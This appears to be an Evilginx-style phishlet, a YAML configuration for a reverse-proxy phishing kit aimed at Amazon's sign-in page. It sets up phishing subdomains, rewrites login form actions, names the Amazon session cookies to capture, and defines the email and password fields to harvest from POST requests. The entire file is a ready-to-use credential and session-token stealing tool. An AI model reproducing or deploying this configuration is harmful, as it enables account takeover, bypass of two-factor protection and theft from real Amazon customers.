authr: '@unicorn-art'                                                                     
min_ver: '2.3.0'                                                                        
proxy_hosts:                                                                              
 - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}                                                                                    
 - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: false, landing: false}                                                                             
sub_filters:                                                                              
 - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'action="https://{hostname}/ap/', replace: 'action="https://{hostname}/ap/', mimes: ['text/html;charset=UTF-8']}                                                                       
 - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'action="https://{hostname}/1/batch/1/', replace: 'action="https://{hostname}/1/batch/1/', mimes: ['text/plain;charset=UTF-8']}                                                
auth_tokens:                                                                               
 domain: '.amazon.com'                                                                   
 keys: ['at-main','lc-main','sess-at-main','sst-main','ubid-main','x-main','skin','session-id','session-id-time','session-token']                                            
credentials:                                                                              
 username:                                                                                 
  key: 'email'                                                                            
  search: '(.*)'                                                                          
  type: 'post'                                                                          
 password:                                                                                 
  key: 'password'                                                                         
  search: '(.*)'                                                                          
  type: 'post'                                                                        
login:                                                                                    
 domain: 'www.amazon.com'                                                                
 path: '/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3F_encoding%3DUTF8%26ref_%3Dnavm_hdr_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=anywhere_v2_us&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&'
